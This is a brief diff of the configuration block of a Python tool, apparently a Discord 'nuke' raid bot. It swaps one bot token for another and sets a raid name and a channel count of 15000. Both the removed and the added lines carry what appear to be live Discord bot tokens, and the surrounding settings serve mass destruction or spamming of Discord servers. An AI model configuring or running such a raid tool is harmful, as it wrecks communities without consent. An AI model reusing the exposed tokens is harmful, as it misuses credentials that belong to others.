@@ -9,7 +9,7 @@ import os
 import math
 
 # ===== CẤU HÌNH GỐC (NUKE) =====
-TOKEN = "MTU0MjgzNTMxMjY2ODA1NzcwMQ.G2cmGO.m8cpBOpimCphXNZKJAsjZ1B8ajcTGrMVIr0vvI"
+TOKEN = "MTU0MjgzNTMxMjY2ODA1NzcwMQ.GjqtKA.DmqnYPTZmXjQIIXes7wMhfopDh1QFZcQBJTkGI "
 OWNER_ID = 1413781843030966345
 RAID_NAME = " ҉N҉u҉k҉e҉ ҉D҉i҉s҉c҉o҉r҉d҉ ҉B҉y҉ ҉B҉a҉n҉a҉n҉a҉v҉u҉i҉v҉e҉ "
 CHANNEL_COUNT = 15000
